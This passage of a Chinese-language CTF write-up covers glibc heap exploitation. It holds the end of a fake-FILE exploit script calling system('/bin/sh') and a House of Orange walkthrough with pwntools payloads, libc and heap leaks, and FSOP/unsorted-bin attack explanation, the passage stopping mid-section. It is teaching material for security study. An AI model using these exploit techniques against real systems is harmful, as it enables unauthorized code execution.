class="line"><span class="comment"># print(libc_addr)</span></span><br><span class="line"><span class="comment"># libc.address = int(libc_addr.split(&#x27;-&#x27;)[-3].split(&#x27;\n&#x27;)[1], 16)</span></span><br><span class="line"><span class="comment"># # log.info(&quot;\033[33m&quot; + hex(libc.address) + &quot;\033[0m&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------- set localhost libc --------</span></span><br><span class="line"></span><br><span class="line">libc.address = <span class="number">0xf7e17000</span></span><br><span class="line">lg(<span class="string">&#x27;libc addr:&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b _IO_new_fclose</span></span><br><span class="line"><span class="string">    b *0xf7e74a60</span></span><br><span class="line"><span class="string">    b *0xF7E80910</span></span><br><span class="line"><span class="string">    b *0xF7E80917</span></span><br><span class="line"><span class="string">    b *0xf7e74a24</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- set fp ---&gt; buffer addr -------</span></span><br><span class="line">buffer = <span class="number">0x804b260</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(buffer)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(buffer+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- fake fp ---&gt; _lock pointer to 0 -----</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x48,&#x27;\x00&#x27;) </span></span><br><span class="line"><span class="comment"># payload += p32(buffer+0x10)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x94,&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment"># payload += p32(0x804b2f8 - 0x44)</span></span><br><span class="line"><span class="comment"># payload += p32(0xdeadbeef)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p32(libc.symbols[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;system addr:&#x27;</span>,libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">leave_name(payload)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># lg(&quot;libc addr:&quot;,libc.address)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-houseoforange"><a href="#0x02-houseoforange" class="headerlink" title="0x02 houseoforange"></a>0x02 houseoforange</h2><p>这其实是一种，在没有 free 的情况下，构造 unsorted bin 进行 libc leak的方法。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4173">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4172</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305030416.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305030416.png"></a></p><p>当用户申请的 chunk， top  chunk 不能满足的时候，有可能使用 sysmalloc 进行内存分配，当调用 sysmalloc 分配的时候，这里有两个选择</p><ol><li>mmap</li><li>扩展brk</li></ol><p><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#2336">sysmalloc source code</a></p><p>从源码我们可以得知，如果得满足 <code>(*unsigned* *long*) (nb) &gt;= (*unsigned* *long*) (mp_.mmap_threshold)</code> 不成立，则不会调用mmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">          &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line">    try_mmap:</span><br></pre></td></tr></table></figure><p>当申请的 chunk 大小不大于 mmap 分配阈值，mmap_threshold<code>的值为</code>128*1024</p><p>扩展 brk top chunk 的时候还有两个assert 的存在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure><p>总结下就是：</p><ol><li><p>old_size &gt;= MINSIZE，即old_size不能太小</p></li><li><p>old_top 设置了 prev_inuse 标志位</p></li><li><p>old_end正好为页尾，即(&amp;old_top+old_size)&amp;(0x1000-1) == 0</p></li><li><p>old_size &lt; nb+MINSIZE，old_size不够需求</p></li></ol><p>当 top chunk 扩展完毕，旧的top chunk就会被free掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    set_head (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">    set_foot (chunk_at_offset (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">    set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">    _int_free (av, old_top, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>支持，如果我们能覆盖 top chunk，则可能伪造一个 unsorte bin ，进行info leak 。以及此处还有另外一个 trick</p><p>当我们申请一个largebin 的时候</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = smallbin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     victim_index = largebin_index (size);</span><br><span class="line">     bck = bin_at (av, victim_index);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">     <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">         size |= PREV_INUSE;</span><br><span class="line">         <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">         assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">         <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">             &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">           &#123;</span><br><span class="line">             fwd = bck;</span><br><span class="line">             bck = bck-&gt;bk;</span><br><span class="line">             victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">             victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">             fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p><code>malloc</code>源码中还把<code>old_top</code>的堆地址放到了堆里面，所以如果再次分配时候如果分配大小为<code>largebin</code>(也就是大于512字节)的<code>chunk</code>的话，就是可以既泄露<code>libc</code>又可以泄露<code>heap</code>。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;@          House of Orange          @&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Build the house                  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. See the house                    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Upgrade the house                &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Give up                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice : &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要四个核心功能，重点在 build 和upgrade</p><ul><li><p>build</p><p>程序逻辑还比较清晰的，一共可以<code>build</code>四次，然后每次<code>build</code>的话就是3次堆分配，两次<code>malloc</code>，一次<code>calloc</code>，其中一次<code>malloc</code>是固定分配<code>0x10</code>字节作为控制堆块，里面存放着<code>name</code>和<code>color</code>的信息，另外按输入分配<code>name</code>的大小。</p></li></ul><p>  <a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305033957.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305033957.png"></a></p><ul><li><p>upgrade</p></li></ul><p>在<code>upgrade</code>函数中，修改<code>name</code>时候不顾实际<code>chunk</code>的堆大小是多少，直接进行编辑，最大可编辑<code>0x1000</code>大小，因而存在溢出。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305034058.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190305034058.png"></a></p><p>由于没有 free ，所以这里我们采用上述原理的方法进行 free chunk to unsorte bin</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="overwrite-the-top-chunk"><a href="#overwrite-the-top-chunk" class="headerlink" title="overwrite the top chunk"></a>overwrite the top chunk</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>, <span class="number">0x90</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;c&#x27;</span> * <span class="number">0x90</span></span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>) + p32(<span class="number">0x20</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>) + p64(<span class="number">0xf21</span>)</span><br></pre></td></tr></table></figure><p>通过 堆溢出漏洞覆盖 top chunk，并构造好top chunk 的size 和 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x5555557580e0 (size : 0xf20)</span><br><span class="line">       last_remainder: 0x0 (size : 0x0)</span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">gdb-peda$ x/20gx 0x5555557580e0</span><br><span class="line">0x5555557580e0:0x00000000000000000x0000000000000f21</span><br><span class="line">0x5555557580f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>此时，构造 to chunk size 为 0xf21，满足条件，当申请大于 0xf21 size 的chunk 的时候，即可发生 free</p><h4 id="trigger-int-free"><a href="#trigger-int-free" class="headerlink" title="trigger _int_free()"></a>trigger _int_free()</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upgrade(pay, len(pay), <span class="number">1</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>执行payload 后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55555577a010 (size : 0x20ff0)</span><br><span class="line">       last_remainder: 0x555555758120 (size : 0xec0)</span><br><span class="line">            unsortbin: 0x555555758120 (size : 0xec0)</span><br><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x555555758000      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758020      0x0                 0xa0                 Used                None              None</span><br><span class="line">0x5555557580c0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x5555557580e0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758100      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758120      0x0                 0xec0                Freed     0x2aaaab097b78    0x2aaaab097b78</span><br></pre></td></tr></table></figure><p>此时 old top chunk 被放到了 unsortbin 里，此时我们也有了 main_arean 地址。</p><h4 id="build-a-large-chunk-and-info-leak"><a href="#build-a-large-chunk-and-info-leak" class="headerlink" title="build a large chunk and info leak"></a>build a large chunk and info leak</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">build(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = myu64(io.recvn(<span class="number">6</span>)) &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(libc_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3bd000</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(libc.address) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap with fd_nextsize, bk_nextsize</span></span><br><span class="line">upgrade(<span class="string">&#x27;2&#x27;</span> * <span class="number">0x10</span>, <span class="number">0x400</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">see()</span><br><span class="line">io.recvuntil(<span class="string">&quot;2&quot;</span> * <span class="number">0x10</span>)</span><br><span class="line">heap_addr = myu64(io.recvn(<span class="number">6</span>)) - <span class="number">0x140</span></span><br><span class="line">log.info(<span class="string">&quot;\033[33m&quot;</span> + hex(heap_addr) + <span class="string">&quot;\033[0m&quot;</span>)</span><br></pre></td></tr></table></figure><p>当build 2 一个large bin 的时候 即 大于 512 字节的 chunk，为发生原理写的那个trick 得到heap地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x555555758000      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758020      0x0                 0xa0                 Used                None              None</span><br><span class="line">0x5555557580c0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x5555557580e0      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758100      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758120      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758140      0x0                 0x410                Used                None              None</span><br><span class="line">0x555555758550      0x0                 0x20                 Used                None              None</span><br><span class="line">0x555555758570      0x0                 0xa70                Freed     0x2aaaab097b78    0x2aaaab097b78</span><br><span class="line">0x555555758fe0      0xa70               0x10                 Used                None              None</span><br><span class="line">0x555555758ff0      0x0                 0x10                 Freed                0x0               0x0</span><br><span class="line">Corrupt ?! (size == 0) (0x555555759000)</span><br><span class="line">gdb-peda$ mergeinfo 0x555555758140</span><br><span class="line">==================================</span><br><span class="line">            Merge info</span><br><span class="line">==================================</span><br><span class="line">The chunk will not merge with other</span><br><span class="line">gdb-peda$ x/20gx 0x555555758140</span><br><span class="line">0x555555758140:0x00000000000000000x0000000000000411</span><br><span class="line">0x555555758150:0x00002aaaab090a320x00002aaaab098188</span><br><span class="line">0x555555758160:0x00005555557581400x0000555555758140</span><br></pre></td></tr></table></figure><p>此时，我们也能得到了 libc 地址和heap地址。</p><h4 id="File-Stream-Oriented-Programming（FSOP）"><a href="#File-Stream-Oriented-Programming（FSOP）" class="headerlink" title="File Stream Oriented Programming（FSOP）"></a>File Stream Oriented Programming（FSOP）</h4><p>紧接着，我们面临的另外一个问题就是如何控制程序流程。</p><p>我们知道，出现内存错误的时候一般会调用<code>malloc_printerr</code>，就像下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3547              if (__builtin_expect (fastbin_index (chunksize (victim)) !&#x3D; idx, 0))</span><br><span class="line">3548                malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</span><br></pre></td></tr></table></figure><p>接着跟进一下，发现调用了<code>__libc_message</code>，并且<code>action=do_abort</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">5285    malloc_printerr (const char *str)</span><br><span class="line">5286    &#123;</span><br><span class="line">5287      __libc_message (do_abort, &quot;%s\n&quot;, str);</span><br><span class="line">5288      __builtin_unreachable ();</span><br><span class="line">5289    &#125;</span><br></pre></td></tr></table></figure><p>接着就是调用<code>abort</code>了：<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/libc_fatal.c.html#175">链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">175   if ((action &amp; do_abort))</span><br><span class="line">176     &#123;</span><br><span class="line">177       if ((action &amp; do_backtrace))</span><br><span class="line">178         BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line">179 </span><br><span class="line">180       &#x2F;* Kill the application.  *&#x2F;</span><br><span class="line">181       abort ();</span><br><span class="line">182     &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着就会调用<code>fflush</code>：<a href="https://code.woboq.org/userspace/glibc/stdlib/abort.c.html#abort">链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">70    &#x2F;* Flush all streams.  We cannot close them now because the user</span><br><span class="line">71       might have registered a handler for SIGABRT.  *&#x2F;</span><br><span class="line">72    if (stage &#x3D;&#x3D; 1)</span><br><span class="line">73      &#123;</span><br><span class="line">74        ++stage;</span><br><span class="line">75        fflush (NULL);</span><br><span class="line">76      &#125;</span><br></pre></td></tr></table></figure><p>而<code>fflush</code>对应着下面这个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5   #define fflush(s) _IO_flush_all_lockp (0)</span><br></pre></td></tr></table></figure><p>这就是关键了：<a href="https://code.woboq.org/userspace/glibc/libio/genops.c.html#_IO_flush_all_lockp">链接</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)<span class="comment">// 汇编abort + 248调用</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);<span class="comment">// 需要覆盖的地方</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="comment">// 需要篡改为system的函数 汇编b *_IO_flush_all_lockp+356</span></span><br><span class="line">        result = EOF;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![image-20190305040412416](/Users/swing/Library/Application Support/typora-user-images/image-20190305040412416.png)</p><p>如果我们能伪造上述的file struck ，那么就能get shell，伪造的前提，我们得能控制 _IO_list_all .此时我们在unsorted bin 和 堆溢出的条件下，是能利用 unsortbin attack ，向 _IO_list_all 写入一个指针。</p><p><code>unsortbin attack</code>是怎么一回事呢，其实就是在<code>malloc</code>的过程中，<code>unsortbin</code>会从链表上卸下来（只要分配的大小不是<code>fastchunk</code>大小） </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>如上代码所示，就是会把<code>bk+0x10</code>的地方写入本unsort_bin的地址， </p><p>当 fake 了 unsoted bin 的 bk的时候，再一次malloc 时候，在_ini_malloc 即可完成 unsortbin attack。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 